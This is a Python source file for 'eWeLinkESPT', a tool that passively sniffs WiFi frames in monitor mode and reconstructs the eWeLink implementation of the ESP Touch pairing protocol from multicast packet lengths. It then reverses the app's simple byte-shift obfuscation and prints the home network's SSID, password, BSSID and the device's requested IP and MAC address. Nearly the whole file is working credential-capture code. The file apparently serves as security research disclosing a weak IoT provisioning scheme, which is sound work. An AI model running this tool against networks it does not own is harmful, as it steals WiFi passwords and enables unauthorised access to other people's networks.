#!/usr/bin/python3

# eWeLinkESPT is a tool to decode and decrypt the WiFi network credentials transmitted to an ESP-based IoT device supported by the eWeLink mobile application.
# This tool reverses the eWeLink own implementation of the ESP Touch protocol, which is used by-default in the WiFi pairing process of the sonoff and many other IoT devices.
# This tool has been tested with the Android (v4.9.2 and earlier) and iOS (v4.9.1 and earlier) eWeLink application versions.

import pyshark
import sys
import traceback
from tools import rotate, getNextMulticastMAC, printPacket, checkPacketQoS, isMulticastAddress, checkPacketFCS

version = '0.1'

def main():
    #Set the initial state and other variables
    current_state = 'start'
    global_offset = 0
    GC_buffer = []
    DC_buffer = []
    global_ta = ''
    global_check_on_ta = False

    capture = pyshark.LiveCapture(interface='en0', monitor_mode=True)
    print('eWeLinkESPT v'+ version +'.\nWe\'re up & running...\nWaiting for incoming packets.')

    for packet in capture.sniff_continuously():

        try:
            if(checkPacketQoS(packet) and checkPacketFCS(packet)):

                p_len = 0
                # This takes into account whether the WiFi network is encrypted or not
                if("IP" in str(packet.layers)):
                    p_len = int(packet['IP'].get_field_value('len'))
                else:
                    p_len = int(packet.layers[3].get_field_value('len'))
                p_da = str(packet.layers[2].get_field_value('da_resolved'))
                p_ta = str(packet.layers[2].get_field_value('ta_resolved'))

                if(global_check_on_ta == False):
                    global_ta = p_ta
            

                if(isMulticastAddress(p_da) and global_ta == p_ta):
                    print('------------------------------------')

                    if(current_state == 'start'):
                        print('current_state: ' + current_state +
                            '.\nWaiting for the GC sequence to start')
                        if(p_len >= 512):
                            printPacket(packet)
                            GC_buffer.append([p_len, p_da])
                            print("Jumping to state gc1.")
                            current_state = 'gc1'

                    elif(current_state == 'gc1'):
                        print('current_state: ' + current_state)
                        if(p_len >= 512):
                            printPacket(packet)

                            if(p_len == GC_buffer[-1][0]-1 and p_da == GC_buffer[-1][1]):
                                GC_buffer.append([p_len, p_da])
                                print("Jumping to state gc2.")
                                current_state = 'gc2'
                            else:
                                print("Inconsistency detected, resetting")
                                GC_buffer = []
                                GC_buffer.append([p_len, p_da])
                        else:
                            print("Error detected, coming back to start")
                            GC_buffer = []
                            GC_buffer.append([p_len, p_da])
                            current_state = 'start'

                    elif (current_state == 'gc2'):
                        print('current_state: ' + current_state)
                        if(p_len >= 512):
                            printPacket(packet)

                            if(p_len == GC_buffer[-1][0]-1 and p_da == GC_buffer[-1][1]):
                                GC_buffer.append([p_len, p_da])
                                print("Jumping to state gc3.")
                                current_state = 'gc3'
                            else:
                                print("Inconsistency detected, resetting")
                                GC_buffer = []
                                GC_buffer.append([p_len, p_da])
                                current_state = 'gc1'
                        else:
                            print("Error detected, coming back to start")
                            GC_buffer = []
                            GC_buffer.append([p_len, p_da])
                            current_state = 'start'

                    elif (current_state == 'gc3'):
                        print('current_state: ' + current_state)
                        if(p_len >= 512):
                            printPacket(packet)

                            if(p_len == GC_buffer[-1][0]-1 and p_da == GC_buffer[-1][1]):
                                GC_buffer.append([p_len, p_da])
                                print("Jumping to state gcok.")
                                current_state = 'gcok'
                            else:
                                print("Inconsistency detected, resetting")
                                GC_buffer = []
                                GC_buffer.append([p_len, p_da])
                                current_state = 'gc1'
                        else:
                            print("Error detected, coming back to start")
                            GC_buffer = []
                            GC_buffer.append([p_len, p_da])
                            current_state = 'start'

                    elif (current_state == 'gcok'):
                        print('current_state: ' + current_state)
                        printPacket(packet)

                        global_offset = GC_buffer[-1][0]-512
                        if((p_len - global_offset) < 512):
                            print('global_offset: ' + str(global_offset))
                            DC_buffer.append([p_len, p_da])
                            print("Jumping to state dc1.")
                            global_check_on_ta = True
                            print('GC completed, global_ta has been set to: ' + str(global_ta))
                            current_state = 'dc1'

                    elif (current_state == 'dc1'):
                        print('current_state: ' + current_state)
                        printPacket(packet)

                        if((p_len - global_offset) < 512):

                            if(p_da == DC_buffer[-1][1] and p_len == DC_buffer[-1][0]):
                                print("Got repeated packet, ignoring it...")

                            elif(p_da == DC_buffer[-1][1]):
                                print("Jumping to state dc2.")
                                DC_buffer.append([p_len, p_da])
                                current_state = 'dc2'
                            else:
                                print('Error in dc1, staying in dc1, now setting to \'x\' next 3 logged packets (error)')
                                prev_p_da = DC_buffer[-1][1]
                                DC_buffer.pop(-1)
                                DC_buffer.append(['x', prev_p_da])
                                DC_buffer.append(['x', prev_p_da])
                                DC_buffer.append(['x', prev_p_da])
                                while(p_da != getNextMulticastMAC(DC_buffer[-1][1])):
                                    print("An error occurred in multicast destination address sequence")
                                    next_addr = getNextMulticastMAC(DC_buffer[-1][1])
                                    print('writing x3: ' + str(next_addr))
                                    DC_buffer.append(['x', next_addr])
                                    DC_buffer.append(['x', next_addr])
                                    DC_buffer.append(['x', next_addr])
                                DC_buffer.append([p_len, p_da])
                        else:
                            DC_buffer.pop(-1)
                            print('jumping to final')
                            current_state = 'end'

                    elif (current_state == 'dc2'):
                        print('current_state: ' + current_state)
                        printPacket(packet)
                        if((p_len - global_offset) < 512):

                            if(p_da == DC_buffer[-1][1] and p_len == DC_buffer[-1][0]):
                                print("Got repeated packet, ignoring it...")
                            elif(p_da == DC_buffer[-1][1]):
                                print("Jumping to state dc3.")
                                DC_buffer.append([p_len, p_da])
                                current_state = 'dc3'
                            else:
                                print('Error in dc2, jumping in dc1, now setting to \'x\' the current x3 frame (error)')
                                prev_p_da = DC_buffer[-1][1]
                                DC_buffer.pop(-1)
                                DC_buffer.pop(-1)
                                DC_buffer.append(['x', prev_p_da])
                                DC_buffer.append(['x', prev_p_da])
                                DC_buffer.append(['x', prev_p_da])
                                DC_buffer.append([p_len, p_da])
                                current_state = 'dc1'
                        else:
                            DC_buffer.pop(-1)
                            DC_buffer.pop(-1)
                            print('Jumping to state final')
                            current_state = 'end'

                    elif (current_state == 'dc3'):
                        print('current_state: ' + current_state)
                        printPacket(packet)
                        if((p_len - global_offset) < 512):

                            if(p_len == DC_buffer[-1][0]):
                                print("Got repeated packet, ignoring it...")

                            else:
                                print("Jumping to state dc1.")
                                while(str(p_da) != str(getNextMulticastMAC(DC_buffer[-1][1]))):
                                    print("An error occurred in multicast destination address sequence")
                                    next_addr = getNextMulticastMAC(DC_buffer[-1][1])
                                    print('Now setting to \'x\' the current x3 frame (error): ' + str(next_addr))
                                    DC_buffer.append(['x', next_addr])
                                    DC_buffer.append(['x', next_addr])
                                    DC_buffer.append(['x', next_addr])

                                DC_buffer.append([p_len, p_da])
                                current_state = 'dc1'
                        else:
                            print('Jumping to state final')
                            current_state = 'end'

                    elif (current_state == 'end'):
                        print('current_state: ' + current_state)
                        print('Now decrypting and decoding.\n')
                        capture.close()

                        # packet.length extraction
                        packet_len_DC_array = list(map(lambda x: x[0], DC_buffer))

                        print("This is the DC sequence we collected\npacket_len_DC_array len(" +
                            str(len(packet_len_DC_array)) + '):')
                        print(packet_len_DC_array)
                        print('\n')

                        # sequence number array
                        DC_sequence_array = []
                        # sequence number extraction
                        for i in range(1, len(packet_len_DC_array), 3):
                            DC_sequence_array.append(packet_len_DC_array[i])
                        print('These are the extracted sequence numbers\nDC_sequence_array len(' +
                            str(len(DC_sequence_array)) + '):')
                        print(DC_sequence_array)
                        print('\n')

                        # The following code section is to retrieve min & max sequence values and then calculate the cut interval.
                        x_pruned_DC_sequence_array = []
                        for elem in DC_sequence_array:
                            if(elem != 'x'):
                                x_pruned_DC_sequence_array.append(elem)

                        DC_cut_interval = max(x_pruned_DC_sequence_array) - min(x_pruned_DC_sequence_array) + 1
                        print('DC_cut_interval:' + str(DC_cut_interval))

                        # Splitting the sequence array by the cut interval
                        DC_sequence_array_splitted = []
                        for i in range(0, len(DC_sequence_array), DC_cut_interval):
                            DC_sequence_array_splitted.append(
                                DC_sequence_array[i: i+DC_cut_interval])

                        # Normalizing the last sub_array
                        if(len(DC_sequence_array_splitted[0]) != len(DC_sequence_array_splitted[-1])):
                            x_to_add = len(
                                DC_sequence_array_splitted[0]) - len(DC_sequence_array_splitted[-1])
                            for i in range(0, x_to_add):
                                DC_sequence_array_splitted[-1].append('x')

                        print('Splitted Sequence Arrays ('+ str(len(DC_sequence_array_splitted))+ '):')
                        for elem in DC_sequence_array_splitted:
                            print(elem)
                        print('\n')

                        # Now working on DC array, splitting it in sub arrays.
                        DC_buffer_to_decode = []
                        for i in range(0, len(packet_len_DC_array), len(DC_sequence_array_splitted[0])*3):
                            DC_buffer_to_decode.append(packet_len_DC_array[i:i+len(DC_sequence_array_splitted[0])*3])

                        print('DC arrays, there are #('+ str(len(DC_buffer_to_decode))+') sequence which can be used to fix not-overlapping errors:')
                        for elem in DC_buffer_to_decode:
                            print(elem)
                        print('\n')

                        print('Trying to fix communication errors (if any).')
                        for i in range(0, len(DC_sequence_array_splitted[0])):
                            if(DC_sequence_array_splitted[0][i] == 'x'):
                                print('Trying to fix error on sequence.index ' + str(i) + '.')
                                for j in range(1, len(DC_sequence_array_splitted)):
                                    if(DC_sequence_array_splitted[j][i] != 'x'):
                                        print('- Error at index ' + str(i) + ' fixed using DC array #' + str(j))
                                        DC_sequence_array_splitted[0][i] = DC_sequence_array_splitted[j][i]
                                        DC_buffer_to_decode[0][i*3] = DC_buffer_to_decode[j][i*3]
                                        DC_buffer_to_decode[0][i*3+1] = DC_buffer_to_decode[j][i*3+1]
                                        DC_buffer_to_decode[0][i*3+2] = DC_buffer_to_decode[j][i*3+2]
                                        break
                        print('\n')

                        #Check if the DC sequence is valid
                        for elem in DC_buffer_to_decode[0]:
                            if(elem == 'x'):
                                #Fatal Error: DC sequence could not be recovered, jumping back to start
                                current_state = 'start'
                        
                        
                        if(current_state == 'end'):
                            print('Ok, DC is a valid sequence\nFinal sequence to be decoded, not yet reordered by sequence number value')
                            print(DC_buffer_to_decode[0])

                            val2shift = DC_sequence_array_splitted[0].index(min(DC_sequence_array_splitted[0]))
                            DC_sequence_array_splitted[0] = rotate(DC_sequence_array_splitted[0], val2shift)
                            DC_buffer_to_decode[0] = rotate(DC_buffer_to_decode[0], val2shift*3)
                            print('\n')
                            print('Final Array to be decoded, reordered by sequence number value')
                            print(DC_buffer_to_decode[0])
                            print('\n')

                            # subtracting 28h and the offset
                            DC_buffer_to_decode[0] = list(map(lambda x: (x - 40 - int(global_offset)), DC_buffer_to_decode[0]))

                            databytes_without_seq = []
                            databytes_without_seq.append(DC_buffer_to_decode[0][0])

                            # extracting only data bytes, without sequence number
                            for i in range(2, len(DC_buffer_to_decode[0]), 3):
                                if(i != len(DC_buffer_to_decode[0])-1):
                                    databytes_without_seq.append(DC_buffer_to_decode[0][i])
                                    databytes_without_seq.append(DC_buffer_to_decode[0][i+1])
                                else:
                                    databytes_without_seq.append(DC_buffer_to_decode[0][i])
                            print('Byte array to be decrypted (witout sequence numbers) len(' + str(len(databytes_without_seq)) + '):')
                            print(databytes_without_seq)
                            print('\n')

                            # to hex
                            databytes_without_seq = list(map(lambda x: format(
                                (int(x) & 255), "02x"), databytes_without_seq))

                            final_databytes = []
                            for i in range(0, len(databytes_without_seq), 2):
                                final_databytes.append(
                                    str(databytes_without_seq[i][1]) + str(databytes_without_seq[i+1][1]))
                            
                            print('Byte array to be decrypted (witout sequence numbers) already coupled as HEX len(' + str(len(databytes_without_seq)) + '):')
                            print(final_databytes)

                            # Decoding and decrypting
                            if(int(final_databytes[0], 16) == len(final_databytes)):
                                final_databytes = list(
                                    map(lambda x: bytes.fromhex(x), final_databytes))
                                pass_len = int.from_bytes(
                                    final_databytes[1], byteorder='big')
                                ip_addr_arr = final_databytes[5:9]
                                ip_addr_arr = list(
                                    map(lambda x: int.from_bytes(x, byteorder='big'), ip_addr_arr))
                                str_ipAddr = str(ip_addr_arr[0]) + "." + str(ip_addr_arr[1]) + "." + str(
                                    ip_addr_arr[2]) + "." + str(ip_addr_arr[3])
                                

                                pass_arr = final_databytes[9:9+pass_len]
                                for i in range(0, len(pass_arr)):
                                    if(i % 2 == 0):
                                        pass_arr[i] = int(int.from_bytes(
                                            pass_arr[i], byteorder='big') - 7).to_bytes(1, byteorder='big')
                                    else:
                                        pass_arr[i] = int(int.from_bytes(
                                            pass_arr[i], byteorder='big') - 2).to_bytes(1, byteorder='big')

                                pass_arr = list(
                                    map(lambda x: x.decode("utf-8"), pass_arr))
                                str_pass = ""
                                for c in pass_arr:
                                    str_pass += str(c)

                                ssid_arr = final_databytes[9+pass_len:]
                                ssid_arr = list(
                                    map(lambda x: x.decode("utf-8"), ssid_arr))
                                str_ssid = ""
                                for c in ssid_arr:
                                    str_ssid += str(c)
                                
                                print("\n\n\nBSSID: " + str(packet.layers[2].get_field_value('bssid_resolved')))
                                print("SSID: " + str(str_ssid))
                                print("Password: " + str(str_pass))
                                print("Requesting IP Address: " + str(str_ipAddr))
                                print("Requesting MAC Address: " + str(packet.layers[2].get_field_value('sa_resolved')))
                                exit()

                        print('Array non correctly decoded, errors occurred.')
                        print('Going back to start, and waiting for another GC sequence.')
                        DC_buffer = []
                        GC_buffer = []
                        global_check_on_ta = False
                        global_ta = ''
                        global_offset = ''


        except Exception:
            # Get current system exception
            ex_type, ex_value, ex_traceback = sys.exc_info()

            # Extract unformatter stack traces as tuples
            trace_back = traceback.extract_tb(ex_traceback)

            # Format stacktrace
            stack_trace = list()

            for trace in trace_back:
                stack_trace.append("File : %s , Line : %d, Func.Name : %s, Message : %s" % (
                    trace[0], trace[1], trace[2], trace[3]))

            print("Exception type : %s " % ex_type.__name__)
            print("Exception message : %s" % ex_value)
            print("Stack trace : %s" % stack_trace)
            print("Packet: " + str(packet))
            exit()


if __name__ == "__main__":
    main()